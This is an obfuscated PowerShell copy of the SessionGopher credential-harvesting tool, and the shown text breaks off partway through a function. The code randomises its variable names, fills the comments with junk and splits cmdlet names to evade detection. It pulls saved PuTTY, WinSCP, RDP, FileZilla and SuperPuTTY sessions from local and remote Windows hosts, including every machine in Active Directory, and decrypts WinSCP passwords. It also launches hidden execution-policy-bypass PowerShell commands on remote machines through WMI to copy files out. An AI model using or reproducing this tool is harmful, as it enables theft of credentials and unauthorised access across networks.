function Invoke-SessionGopher {
  param (
      [switch]$nFdMHRmJUTihVghjwpEMqoB, # Microsoft".
      [switch]$NuFyNRnVcuXYDNHfsgjXUaLp, # Microsoft".
      [string]$pxpEnoyFXZoXUXWepVVjNpnKVBNhm, # Microsoft".
      [string]$HZVqrHhIDXUmKLuSFrRAJqOWmaAVLb, # Microsoft".
      [string]$NmhwDRUaDzPVRZKQJZXKDb, # Microsoft".
      [string]$QonQnbkKcDuNAMTMVVazYCoHlkLaWNiDyaFEuGNnthHnI, # Microsoft".
      [switch]$XYvWFZWJvlMAzGYaPPRjX # Microsoft".
  )

  Write-Output '
          o_       
         /  ".   SessionGopher
       ,"  _-"      
     ,"   m m         
  ..+     )      Brandon Arvanaghi
     `m..m       Twitter: @arvanaghi | arvanaghi.com
  '

  if ($nFdMHRmJUTihVghjwpEMqoB) {
    $GAwlvlpwYPsIYDQPRdOJ = "SessionGopher (" + (Get-Date -Format "HH.mm.ss") + ")"
    New-Item -ItemType Directory $GAwlvlpwYPsIYDQPRdOJ | Out-Null
    New-Item ($GAwlvlpwYPsIYDQPRdOJ + "\PuTTY.csv") -Type File | Out-Null
    New-Item ($GAwlvlpwYPsIYDQPRdOJ + "\SuperPuTTY.csv") -Type File | Out-Null
    New-Item ($GAwlvlpwYPsIYDQPRdOJ + "\WinSCP.csv") -Type File | Out-Null
    New-Item ($GAwlvlpwYPsIYDQPRdOJ + "\FileZilla.csv") -Type File | Out-Null
    New-Item ($GAwlvlpwYPsIYDQPRdOJ + "\RDP.csv") -Type File | Out-Null
    if ($NuFyNRnVcuXYDNHfsgjXUaLp) {
        New-Item ($GAwlvlpwYPsIYDQPRdOJ + "\PuTTY ppk Files.csv") -Type File | Out-Null
        New-Item ($GAwlvlpwYPsIYDQPRdOJ + "\Microsoft rdp Files.csv") -Type File | Out-Null
        New-Item ($GAwlvlpwYPsIYDQPRdOJ + "\RSA sdtid Files.csv") -Type File | Out-Null
    }
  }

  if ($pxpEnoyFXZoXUXWepVVjNpnKVBNhm -and $HZVqrHhIDXUmKLuSFrRAJqOWmaAVLb) {
    $XssJWKNYEUORVeOpxpTFwFu = ConvertTo-SecureString $HZVqrHhIDXUmKLuSFrRAJqOWmaAVLb -AsPlainText -Force
    $Credentials = ne`w`-`ob`je`ct -Typename System.Management.Automation.PSCredential -ArgumentList $pxpEnoyFXZoXUXWepVVjNpnKVBNhm, $XssJWKNYEUORVeOpxpTFwFu
  }

  # Microsoft".
  $OjHeEeSRTjqYbdSIyTxBehBNEspRF = 2147483651
  # Microsoft".
  $QMcEPEqyaloTlYTzaWKVWImIMOQVOHUnpyih = 2147483650

  $aVjehgNTFEbvQsuPTMIoDonHJjPRXQi = "\SOFTWARE\SimonTatham\PuTTY\Sessions"
  $JqUcuPbazeouvSZUdWmLHRsvwnOaf = "\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"
  $BkGbmSVYcilnyPYKLRRDDRoYXtZmV = "\SOFTWARE\Microsoft\Terminal Server Client\Servers"

  if ($NmhwDRUaDzPVRZKQJZXKDb -or $XYvWFZWJvlMAzGYaPPRjX -or $QonQnbkKcDuNAMTMVVazYCoHlkLaWNiDyaFEuGNnthHnI) {

    # Microsoft".
    $Reader = ""

    if ($XYvWFZWJvlMAzGYaPPRjX) {
      $Reader = GetComputersFromActiveDirectory
    } elseif ($NmhwDRUaDzPVRZKQJZXKDb) { 
      $Reader = Get-Content ((Resolve-Path $NmhwDRUaDzPVRZKQJZXKDb).Path)
    } elseif ($QonQnbkKcDuNAMTMVVazYCoHlkLaWNiDyaFEuGNnthHnI) {
      $Reader = $QonQnbkKcDuNAMTMVVazYCoHlkLaWNiDyaFEuGNnthHnI
    }

    $RRhIihzIVOZRZmDMpJSdhcGovLlmbNimCixfNnYAWY = @{}
    if ($Credentials) {
      $RRhIihzIVOZRZmDMpJSdhcGovLlmbNimCixfNnYAWY['Credential'] = $Credentials
    }

    foreach ($yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF in $Reader) {

      if ($XYvWFZWJvlMAzGYaPPRjX) {
        # Microsoft".
        $yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF = $yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF.Properties.name
        if (!$yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF) { Continue }
      }

      Write-Host -NoNewLine -ForegroundColor "DarkGreen" "[+] "
      Write-Host "Digging on" $yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF"..."

      $PSRKgrhnRAXuFDtTuJrourhOKD = Invoke-WmiMethod -Class 'StdRegProv' -Name 'EnumKey' -ArgumentList $OjHeEeSRTjqYbdSIyTxBehBNEspRF,'' -ComputerName $yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF @optionalCreds | Select-Object -ExpandProperty sNames | Where-Object {$_ -match 'S-1-5-21-[\d\-]+$'}

      foreach ($qHdJtBeluOOwrzppLFhGqwcYNogDLhVOwxVABB in $PSRKgrhnRAXuFDtTuJrourhOKD) {

        # Microsoft".
        $pKFZCQrLzGNzdmUNdhBdvCunsIPOo = try { (Split-Path -Leaf (Split-Path -Leaf (GetMappedSID))) } catch {}
        $BMsqhbcZYwkwfMupnghp = (($yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF + "\" + $pKFZCQrLzGNzdmUNdhBdvCunsIPOo) -Join "")

        # Microsoft".
        $tHugALOaXKmLXhgXdEjXRUOG = ne`w`-`ob`je`ct PSObject

        $novtuvVGrxDTTVCRNsEwoC = ne`w`-`ob`je`ct System.Collections.ArrayList
        $bVQdQAAqTINLSHvHqjXEZwziqugApeKaNLAuGJkXTzUWY = ne`w`-`ob`je`ct System.Collections.ArrayList
        $BtUaCCvgPWNHcXFnMqfwlhRaRHPBu = ne`w`-`ob`je`ct System.Collections.ArrayList
        $cTWMuhzRBpgLjOdAEBuayABpY = ne`w`-`ob`je`ct System.Collections.ArrayList
        $NUgoIBqEFfqnICmHgTEYcFyaLOsVsCF = ne`w`-`ob`je`ct System.Collections.ArrayList

        # Microsoft".
        $yAtdnHIVTQbGhgZPtmBnyLPLgyyVZeFodSEfi = $qHdJtBeluOOwrzppLFhGqwcYNogDLhVOwxVABB + $BkGbmSVYcilnyPYKLRRDDRoYXtZmV
        $qdBvqVgNPRZmYEkDsaYxARhySNggzttDFBrTXuwL = $qHdJtBeluOOwrzppLFhGqwcYNogDLhVOwxVABB + $aVjehgNTFEbvQsuPTMIoDonHJjPRXQi
        $zDWsbFANxXhtGEFHMWpqStvM = $qHdJtBeluOOwrzppLFhGqwcYNogDLhVOwxVABB + $JqUcuPbazeouvSZUdWmLHRsvwnOaf
        $drddzvJSSGtjmeeYgTnaWFWYmQBLepyfLOMxyki = "Drive='C:' AND Path='\\Users\\$pKFZCQrLzGNzdmUNdhBdvCunsIPOo\\Documents\\SuperPuTTY\\' AND FileName='Sessions' AND Extension='XML'"
        $FileZillaFilter = "Drive='C:' AND Path='\\Users\\$pKFZCQrLzGNzdmUNdhBdvCunsIPOo\\AppData\\Roaming\\FileZilla\\' AND FileName='sitemanager' AND Extension='XML'"

        $GeidNmDrhZwDYCUvJqNKqrRPvX = Invoke-WmiMethod -ComputerName $yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF -Class 'StdRegProv' -Name EnumKey -ArgumentList $OjHeEeSRTjqYbdSIyTxBehBNEspRF,$yAtdnHIVTQbGhgZPtmBnyLPLgyyVZeFodSEfi @optionalCreds
        $qkvhNkYJRQAmMxSIAMZqZTRkiPQVpOzYwfmYR = Invoke-WmiMethod -ComputerName $yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF -Class 'StdRegProv' -Name EnumKey -ArgumentList $OjHeEeSRTjqYbdSIyTxBehBNEspRF,$qdBvqVgNPRZmYEkDsaYxARhySNggzttDFBrTXuwL @optionalCreds
        $csOaknHDomNorAeXbcHTasAnnRO = Invoke-WmiMethod -ComputerName $yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF -Class 'StdRegProv' -Name EnumKey -ArgumentList $OjHeEeSRTjqYbdSIyTxBehBNEspRF,$zDWsbFANxXhtGEFHMWpqStvM @optionalCreds
        $eKfJsKaAHeFmEzEghZmLBqOufAuzACssNYaXKsOTYhhL = (Get-WmiObject -Class 'CIM_DataFile' -Filter $drddzvJSSGtjmeeYgTnaWFWYmQBLepyfLOMxyki -ComputerName $yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF @optionalCreds | Select Name)
        $FileZillaPath = (Get-WmiObject -Class 'CIM_DataFile' -Filter $FileZillaFilter -ComputerName $yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF @optionalCreds | Select Name)

        # Microsoft".
        if (($csOaknHDomNorAeXbcHTasAnnRO | Select-Object -ExpandPropert ReturnValue) -eq 0) {

          # Microsoft".
          $csOaknHDomNorAeXbcHTasAnnRO = $csOaknHDomNorAeXbcHTasAnnRO | Select-Object -ExpandProperty sNames
          
          foreach ($WUcWkqSWPctdJFnoAMstETqzJakrnSqzmafeVbFazUCol in $csOaknHDomNorAeXbcHTasAnnRO) {
      
            $XLgMsnHgjGNxngdhjsJDumISm = "" | Select-Object -Property Source,Session,Hostname,Username,Password
            $XLgMsnHgjGNxngdhjsJDumISm.Source = $BMsqhbcZYwkwfMupnghp
            $XLgMsnHgjGNxngdhjsJDumISm.Session = $WUcWkqSWPctdJFnoAMstETqzJakrnSqzmafeVbFazUCol

            $bVjdnqzzzhBVfbivcJWIU = $zDWsbFANxXhtGEFHMWpqStvM + "\" + $WUcWkqSWPctdJFnoAMstETqzJakrnSqzmafeVbFazUCol

            $XLgMsnHgjGNxngdhjsJDumISm.Hostname = (Invoke-WmiMethod -ComputerName $yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF -Class 'StdRegProv' -Name GetStringValue -ArgumentList $OjHeEeSRTjqYbdSIyTxBehBNEspRF,$bVjdnqzzzhBVfbivcJWIU,"HostName" @optionalCreds).sValue
            $XLgMsnHgjGNxngdhjsJDumISm.Username = (Invoke-WmiMethod -ComputerName $yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF -Class 'StdRegProv' -Name GetStringValue -ArgumentList $OjHeEeSRTjqYbdSIyTxBehBNEspRF,$bVjdnqzzzhBVfbivcJWIU,"UserName" @optionalCreds).sValue
            $XLgMsnHgjGNxngdhjsJDumISm.Password = (Invoke-WmiMethod -ComputerName $yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF -Class 'StdRegProv' -Name GetStringValue -ArgumentList $OjHeEeSRTjqYbdSIyTxBehBNEspRF,$bVjdnqzzzhBVfbivcJWIU,"Password" @optionalCreds).sValue

            if ($XLgMsnHgjGNxngdhjsJDumISm.Password) {

              $EaqfJqtJlleUvpOdxvSDPOMgDjIaTKOTMcSTBUD = $qHdJtBeluOOwrzppLFhGqwcYNogDLhVOwxVABB + "\Software\Martin Prikryl\WinSCP 2\Configuration\Security"
          
              $DzkJihLBUKqMjcDFcYdQZojZfg = (Invoke-WmiMethod -ComputerName $yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF -Class 'StdRegProv' -Name GetDWordValue -ArgumentList $OjHeEeSRTjqYbdSIyTxBehBNEspRF,$EaqfJqtJlleUvpOdxvSDPOMgDjIaTKOTMcSTBUD,"UseMasterPassword" @optionalCreds).uValue
              
              if (!$DzkJihLBUKqMjcDFcYdQZojZfg) {
                  $XLgMsnHgjGNxngdhjsJDumISm.Password = (DecryptWinSCPPassword $XLgMsnHgjGNxngdhjsJDumISm.Hostname $XLgMsnHgjGNxngdhjsJDumISm.Username $XLgMsnHgjGNxngdhjsJDumISm.Password)
              } else {
                  $XLgMsnHgjGNxngdhjsJDumISm.Password = "Saved in session, but master password prevents plaintext recovery"
              }

            }
             
            [void]$NUgoIBqEFfqnICmHgTEYcFyaLOsVsCF.Add($XLgMsnHgjGNxngdhjsJDumISm)
      
          } # Microsoft".

          if ($NUgoIBqEFfqnICmHgTEYcFyaLOsVsCF.count -gt 0) {

            $tHugALOaXKmLXhgXdEjXRUOG | Add-Member -MemberType NoteProperty -Name "WinSCP Sessions" -yCaKhRBajwZzcFWZzuZktofiNRuUCqIyVO $NUgoIBqEFfqnICmHgTEYcFyaLOsVsCF

            if ($nFdMHRmJUTihVghjwpEMqoB) {
              $NUgoIBqEFfqnICmHgTEYcFyaLOsVsCF | Select-Object * | Export-CSV -Append -Path ($GAwlvlpwYPsIYDQPRdOJ + "\WinSCP.csv") -NoTypeInformation
            } else {
              Write-Output "WinSCP Sessions"
              $NUgoIBqEFfqnICmHgTEYcFyaLOsVsCF | Select-Object * | Format-List | Out-String
            }

          }
        
        } # Microsoft".

        if (($qkvhNkYJRQAmMxSIAMZqZTRkiPQVpOzYwfmYR | Select-Object -ExpandPropert ReturnValue) -eq 0) {

          # Microsoft".
          $qkvhNkYJRQAmMxSIAMZqZTRkiPQVpOzYwfmYR = $qkvhNkYJRQAmMxSIAMZqZTRkiPQVpOzYwfmYR | Select-Object -ExpandProperty sNames

          foreach ($AoOfbGWPONhTYplGxHpqXrZE in $qkvhNkYJRQAmMxSIAMZqZTRkiPQVpOzYwfmYR) {
      
            $WtlaLODdIgPDYiuagmShNMQqmMzmrSofalkeGcXpEFmT = "" | Select-Object -Property Source,Session,Hostname

            $bVjdnqzzzhBVfbivcJWIU = $qdBvqVgNPRZmYEkDsaYxARhySNggzttDFBrTXuwL + "\" + $AoOfbGWPONhTYplGxHpqXrZE

            $WtlaLODdIgPDYiuagmShNMQqmMzmrSofalkeGcXpEFmT.Source = $BMsqhbcZYwkwfMupnghp
            $WtlaLODdIgPDYiuagmShNMQqmMzmrSofalkeGcXpEFmT.Session = $AoOfbGWPONhTYplGxHpqXrZE
            $WtlaLODdIgPDYiuagmShNMQqmMzmrSofalkeGcXpEFmT.Hostname = (Invoke-WmiMethod -ComputerName $yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF -Class 'StdRegProv' -Name GetStringValue -ArgumentList $OjHeEeSRTjqYbdSIyTxBehBNEspRF,$bVjdnqzzzhBVfbivcJWIU,"HostName" @optionalCreds).sValue
             
            [void]$novtuvVGrxDTTVCRNsEwoC.Add($WtlaLODdIgPDYiuagmShNMQqmMzmrSofalkeGcXpEFmT)
      
          }

          if ($novtuvVGrxDTTVCRNsEwoC.count -gt 0) {

            $tHugALOaXKmLXhgXdEjXRUOG | Add-Member -MemberType NoteProperty -Name "PuTTY Sessions" -yCaKhRBajwZzcFWZzuZktofiNRuUCqIyVO $novtuvVGrxDTTVCRNsEwoC

            if ($nFdMHRmJUTihVghjwpEMqoB) {
              $novtuvVGrxDTTVCRNsEwoC | Select-Object * | Export-CSV -Append -Path ($GAwlvlpwYPsIYDQPRdOJ + "\PuTTY.csv") -NoTypeInformation
            } else {
              Write-Output "PuTTY Sessions"
              $novtuvVGrxDTTVCRNsEwoC | Select-Object * | Format-List | Out-String
            }

          }

        } # Microsoft".

        if (($GeidNmDrhZwDYCUvJqNKqrRPvX | Select-Object -ExpandPropert ReturnValue) -eq 0) {

          # Microsoft".
          $GeidNmDrhZwDYCUvJqNKqrRPvX = $GeidNmDrhZwDYCUvJqNKqrRPvX | Select-Object -ExpandProperty sNames

          foreach ($axYwJpXfqEgjsBlTzHdOTvudAGUFoE in $GeidNmDrhZwDYCUvJqNKqrRPvX) {
      
            $amqBKYntDmEFiuSMDRfymmDTQFTDB = "" | Select-Object -Property Source,Hostname,Username
            
            $bVjdnqzzzhBVfbivcJWIU = $yAtdnHIVTQbGhgZPtmBnyLPLgyyVZeFodSEfi + "\" + $axYwJpXfqEgjsBlTzHdOTvudAGUFoE

            $amqBKYntDmEFiuSMDRfymmDTQFTDB.Source = $BMsqhbcZYwkwfMupnghp
            $amqBKYntDmEFiuSMDRfymmDTQFTDB.Hostname = $axYwJpXfqEgjsBlTzHdOTvudAGUFoE
            $amqBKYntDmEFiuSMDRfymmDTQFTDB.Username = (Invoke-WmiMethod -ComputerName $yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF -Class 'StdRegProv' -Name GetStringValue -ArgumentList $OjHeEeSRTjqYbdSIyTxBehBNEspRF,$bVjdnqzzzhBVfbivcJWIU,"UserNameHint" @optionalCreds).sValue

            [void]$BtUaCCvgPWNHcXFnMqfwlhRaRHPBu.Add($amqBKYntDmEFiuSMDRfymmDTQFTDB)
      
          }

          if ($BtUaCCvgPWNHcXFnMqfwlhRaRHPBu.count -gt 0) {

            $tHugALOaXKmLXhgXdEjXRUOG | Add-Member -MemberType NoteProperty -Name "RDP Sessions" -yCaKhRBajwZzcFWZzuZktofiNRuUCqIyVO $BtUaCCvgPWNHcXFnMqfwlhRaRHPBu

            if ($nFdMHRmJUTihVghjwpEMqoB) {
              $BtUaCCvgPWNHcXFnMqfwlhRaRHPBu | Select-Object * | Export-CSV -Append -Path ($GAwlvlpwYPsIYDQPRdOJ + "\RDP.csv") -NoTypeInformation
            } else {
              Write-Output "Microsoft RDP Sessions"
              $BtUaCCvgPWNHcXFnMqfwlhRaRHPBu | Select-Object * | Format-List | Out-String
            }

          }

        } # Microsoft".

        # Microsoft".
        if ($eKfJsKaAHeFmEzEghZmLBqOufAuzACssNYaXKsOTYhhL.Name) {

          $File = "C:\Users\$pKFZCQrLzGNzdmUNdhBdvCunsIPOo\Documents\SuperPuTTY\Sessions.xml"
          $FileContents = DownloadAndExtractFromRemoteRegistry $File

          [xml]$xSUZWiIFWzdJkYAJQeScDzPWnccWPMi = $FileContents
          (ProcessSuperPuTTYFile $xSUZWiIFWzdJkYAJQeScDzPWnccWPMi)

        }

        # Microsoft".
        if ($FileZillaPath.Name) {

          $File = "C:\Users\$pKFZCQrLzGNzdmUNdhBdvCunsIPOo\AppData\Roaming\FileZilla\sitemanager.xml"
          $FileContents = DownloadAndExtractFromRemoteRegistry $File

          [xml]$FileZillaXML = $FileContents
          (ProcessFileZillaFile $FileZillaXML)

        } # Microsoft".

      } # Microsoft".

      if ($NuFyNRnVcuXYDNHfsgjXUaLp) {

        $vlmJLoZtYNNkciksuCeMKgsSegTSzeIaBfdWhQJtSHio = ne`w`-`ob`je`ct System.Collections.ArrayList
        $ALyYGPldjWMXbilDGXXuwzTiScIOh = ne`w`-`ob`je`ct System.Collections.ArrayList
        $ROkBCNKdDchnbbrBbYFwJJ = ne`w`-`ob`je`ct System.Collections.ArrayList

        $FilePathsFound = (Get-WmiObject -Class 'CIM_DataFile' -Filter "Drive='C:' AND extension='ppk' OR extension='rdp' OR extension='.sdtid'" -ComputerName $yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF @optionalCreds | Select Name)

        (ProcessThoroughRemote $FilePathsFound)
        
      } 

    } # Microsoft".

  # Microsoft".
  } else { 
    
    Write-Host -NoNewLine -ForegroundColor "DarkGreen" "[+] "
    Write-Host "Digging on"(Hostname)"..."

    # Microsoft".
    $BfdHjfazBjBOrBSdxELjwNBSSOXWH = Get-ChildItem Registry::HKEY_USERS\ -ErrorAction SilentlyContinue | Where-Object {$_.Name -match '^HKEY_USERS\\S-1-5-21-[\d\-]+$'}

    # Microsoft".
    foreach($txgGeZgPwCbJEodqAEpGXCWnFc in $BfdHjfazBjBOrBSdxELjwNBSSOXWH) {

      # Microsoft".
      $tHugALOaXKmLXhgXdEjXRUOG = ne`w`-`ob`je`ct PSObject

      $NUgoIBqEFfqnICmHgTEYcFyaLOsVsCF = ne`w`-`ob`je`ct System.Collections.ArrayList
      $novtuvVGrxDTTVCRNsEwoC = ne`w`-`ob`je`ct System.Collections.ArrayList
      $vlmJLoZtYNNkciksuCeMKgsSegTSzeIaBfdWhQJtSHio = ne`w`-`ob`je`ct System.Collections.ArrayList
      $bVQdQAAqTINLSHvHqjXEZwziqugApeKaNLAuGJkXTzUWY = ne`w`-`ob`je`ct System.Collections.ArrayList
      $BtUaCCvgPWNHcXFnMqfwlhRaRHPBu = ne`w`-`ob`je`ct System.Collections.ArrayList
      $ALyYGPldjWMXbilDGXXuwzTiScIOh = ne`w`-`ob`je`ct System.Collections.ArrayList
      $cTWMuhzRBpgLjOdAEBuayABpY = ne`w`-`ob`je`ct System.Collections.ArrayList

      $VJDhzOuVcyTmbBVbNFcRKQxmIEDsNJlqKFxIVvnJVptj = (GetMappedSID)
      $BMsqhbcZYwkwfMupnghp = (Hostname) + "\" + (Split-Path $VJDhzOuVcyTmbBVbNFcRKQxmIEDsNJlqKFxIVvnJVptj.Value -Leaf)

      $tHugALOaXKmLXhgXdEjXRUOG | Add-Member -MemberType NoteProperty -Name "Source" -yCaKhRBajwZzcFWZzuZktofiNRuUCqIyVO $VJDhzOuVcyTmbBVbNFcRKQxmIEDsNJlqKFxIVvnJVptj.Value

      # Microsoft".
      $qdBvqVgNPRZmYEkDsaYxARhySNggzttDFBrTXuwL = Join-Path $txgGeZgPwCbJEodqAEpGXCWnFc.PSPath "\$aVjehgNTFEbvQsuPTMIoDonHJjPRXQi"
      $zDWsbFANxXhtGEFHMWpqStvM = Join-Path $txgGeZgPwCbJEodqAEpGXCWnFc.PSPath "\$JqUcuPbazeouvSZUdWmLHRsvwnOaf"
      $IPMlLupQlsGXXBuUlXXUhRbAZSS = Join-Path $txgGeZgPwCbJEodqAEpGXCWnFc.PSPath "\$BkGbmSVYcilnyPYKLRRDDRoYXtZmV"
      $FileZillaPath = "C:\Users\" + (Split-Path -Leaf $tHugALOaXKmLXhgXdEjXRUOG."Source") + "\AppData\Roaming\FileZilla\sitemanager.xml"
      $eKfJsKaAHeFmEzEghZmLBqOufAuzACssNYaXKsOTYhhL = "C:\Users\" + (Split-Path -Leaf $tHugALOaXKmLXhgXdEjXRUOG."Source") + "\Documents\SuperPuTTY\Sessions.xml"

      if (Test-Path $FileZillaPath) {

        [xml]$FileZillaXML = Get-Content $FileZillaPath
        (ProcessFileZillaFile $FileZillaXML)

      }

      if (Test-Path $eKfJsKaAHeFmEzEghZmLBqOufAuzACssNYaXKsOTYhhL) {

        [xml]$xSUZWiIFWzdJkYAJQeScDzPWnccWPMi = Get-Content $eKfJsKaAHeFmEzEghZmLBqOufAuzACssNYaXKsOTYhhL
        (ProcessSuperPuTTYFile $xSUZWiIFWzdJkYAJQeScDzPWnccWPMi)

      }

      if (Test-Path $IPMlLupQlsGXXBuUlXXUhRbAZSS) {

        # Microsoft".
        $wnhJBuUaSOFdXzcjoqHLbUhxvFFCSAGeHUfBzE = Get-ChildItem $IPMlLupQlsGXXBuUlXXUhRbAZSS

        (ProcessRDPLocal $wnhJBuUaSOFdXzcjoqHLbUhxvFFCSAGeHUfBzE)

      } # Microsoft".

      if (Test-Path $zDWsbFANxXhtGEFHMWpqStvM) {

        # Microsoft".
        $FOLhptEooVzDRsgCiQbMuulJMtfvQUPgbDkm = Get-ChildItem $zDWsbFANxXhtGEFHMWpqStvM

        (ProcessWinSCPLocal $FOLhptEooVzDRsgCiQbMuulJMtfvQUPgbDkm)

      } # Microsoft".
      
      if (Test-Path $qdBvqVgNPRZmYEkDsaYxARhySNggzttDFBrTXuwL) {

        # Microsoft".
        $KDkkbfOPgFTEDJyySsRbZ = Get-ChildItem $qdBvqVgNPRZmYEkDsaYxARhySNggzttDFBrTXuwL

        (ProcessPuTTYLocal $KDkkbfOPgFTEDJyySsRbZ)

      } # Microsoft".

    } # Microsoft".

    # Microsoft".
    if ($NuFyNRnVcuXYDNHfsgjXUaLp) {

      # Microsoft".
      $vLCzqZfXfTRAtutlzMndAJztthLCt = ne`w`-`ob`je`ct System.Collections.ArrayList
      $skJFGTkoRQFyjrkRqfHA = ne`w`-`ob`je`ct System.Collections.ArrayList
      $OjyOLUObkBJstThdcFNXDjmuBpqQSQZAZZ = ne`w`-`ob`je`ct System.Collections.ArrayList

      # Microsoft".
      $TRlKxRpNHOmnPCXJJRsaZaGZQEVgo = Get-PSDrive

      (ProcessThoroughLocal $TRlKxRpNHOmnPCXJJRsaZaGZQEVgo)
      
      (ProcessPPKFile $vLCzqZfXfTRAtutlzMndAJztthLCt)
      (ProcessRDPFile $skJFGTkoRQFyjrkRqfHA)
      (ProcesssdtidFile $OjyOLUObkBJstThdcFNXDjmuBpqQSQZAZZ)

    } # Microsoft".

  } # Microsoft".

} # Microsoft".

# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".

# Microsoft".
function GetMappedSID {

  # Microsoft".
  if ($NmhwDRUaDzPVRZKQJZXKDb -or $QonQnbkKcDuNAMTMVVazYCoHlkLaWNiDyaFEuGNnthHnI -or $XYvWFZWJvlMAzGYaPPRjX) {
    # Microsoft".
    $tEFuUbQsJcKGTdsqaMJXcQQVKVVqYegiaVJNExAJxpX = "SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\$qHdJtBeluOOwrzppLFhGqwcYNogDLhVOwxVABB"
    $yCaKhRBajwZzcFWZzuZktofiNRuUCqIyVO = "ProfileImagePath"

    return (Invoke-WmiMethod -ComputerName $yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $QMcEPEqyaloTlYTzaWKVWImIMOQVOHUnpyih,$tEFuUbQsJcKGTdsqaMJXcQQVKVVqYegiaVJNExAJxpX,$yCaKhRBajwZzcFWZzuZktofiNRuUCqIyVO @optionalCreds).sValue
  # Microsoft".
  } else {
    # Microsoft".
    $qHdJtBeluOOwrzppLFhGqwcYNogDLhVOwxVABB = (Split-Path $txgGeZgPwCbJEodqAEpGXCWnFc.Name -Leaf)
    $AmCfzxDFnzwwEqtRPtHnsy = ne`w`-`ob`je`ct System.Security.Principal.SecurityIdentifier("$qHdJtBeluOOwrzppLFhGqwcYNogDLhVOwxVABB")
    return $AmCfzxDFnzwwEqtRPtHnsy.Translate( [System.Security.Principal.NTAccount])
  }

}

function DownloadAndExtractFromRemoteRegistry($File) {
  # Microsoft".
  # Microsoft".
  $SKAgugSGFARlazkmCozhg = "HKLM:\Software\Microsoft\DRM"
  $SBfZAZmyhizEaLISypRLGPQilhGzZFyTVXBOYiSmie = "ReadMe"
  $GOKKfJsrfccPgUwczOdlTVJBTyaBEjwqbgQzPGpO = "SOFTWARE\Microsoft\DRM"
          
  # Microsoft".
  Write-Verbose "Reading remote file and writing on remote registry"
  $DAFAlIClaBmCAjzgSOKSptHmBiZtLEcwUzkTw = '$puHjIpXCErqamUgvEWtOqPQoxjVQRklCkSuCT = Get-Content -Encoding byte -Path ''' + "$File" + '''; $qmnsFuEcSkOGPysrzRGcEWwIjfHbAvGqcZGSOhySrzKY = [System.Convert]::ToBase64String($puHjIpXCErqamUgvEWtOqPQoxjVQRklCkSuCT); New-ItemProperty -Path ' + "'$SKAgugSGFARlazkmCozhg'" + ' -Name ' + "'$SBfZAZmyhizEaLISypRLGPQilhGzZFyTVXBOYiSmie'" + ' -yCaKhRBajwZzcFWZzuZktofiNRuUCqIyVO $qmnsFuEcSkOGPysrzRGcEWwIjfHbAvGqcZGSOhySrzKY -PropertyType String -Force'
  $DAFAlIClaBmCAjzgSOKSptHmBiZtLEcwUzkTw = 'powershell -nop -exec bypass -c "' + $DAFAlIClaBmCAjzgSOKSptHmBiZtLEcwUzkTw + '"'

  $null = Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $DAFAlIClaBmCAjzgSOKSptHmBiZtLEcwUzkTw -ComputerName $yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF @optionalCreds

  # Microsoft".
  Start-Sleep -s 15

  $AhNtMxKLxLYSBOGGyFlOcroCVcrLFRtEGyxLbSGD = ""

  # Microsoft".
  $AhNtMxKLxLYSBOGGyFlOcroCVcrLFRtEGyxLbSGD = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $QMcEPEqyaloTlYTzaWKVWImIMOQVOHUnpyih, $GOKKfJsrfccPgUwczOdlTVJBTyaBEjwqbgQzPGpO, $SBfZAZmyhizEaLISypRLGPQilhGzZFyTVXBOYiSmie -Computer $yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF @optionalCreds
  
  $VojKLbxRilZAzVabaFAhAxN = [System.Convert]::FromBase64String($AhNtMxKLxLYSBOGGyFlOcroCVcrLFRtEGyxLbSGD.sValue)
  $oqwKCZkUKRRbMktObDjjLWMXwcElTdXHfZNDqXcdoYz = [System.Text.Encoding]::UTF8.GetString($VojKLbxRilZAzVabaFAhAxN) 
    
  # Microsoft".
  $null = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $BrOVSyCrRyilOliCEiHgmYZLLS, $GOKKfJsrfccPgUwczOdlTVJBTyaBEjwqbgQzPGpO, $SBfZAZmyhizEaLISypRLGPQilhGzZFyTVXBOYiSmie -ComputerName $yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF @optionalCreds
  
  return $oqwKCZkUKRRbMktObDjjLWMXwcElTdXHfZNDqXcdoYz

}

# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".

function ProcessThoroughLocal($TRlKxRpNHOmnPCXJJRsaZaGZQEVgo) {
  
  foreach ($caynckokUAyvlTdUigKqVPgJVr in $TRlKxRpNHOmnPCXJJRsaZaGZQEVgo) {
    # Microsoft".
    if ($caynckokUAyvlTdUigKqVPgJVr.Provider.Name -eq "FileSystem") {
      $ZrTrNHuTDbFrLOWYHppzjchtTSW = Get-ChildItem $caynckokUAyvlTdUigKqVPgJVr.Root -Recurse -ErrorAction SilentlyContinue
      foreach ($lqdoiawDTFBwBHhKTUCnfKMKcjJBUz in $ZrTrNHuTDbFrLOWYHppzjchtTSW) {
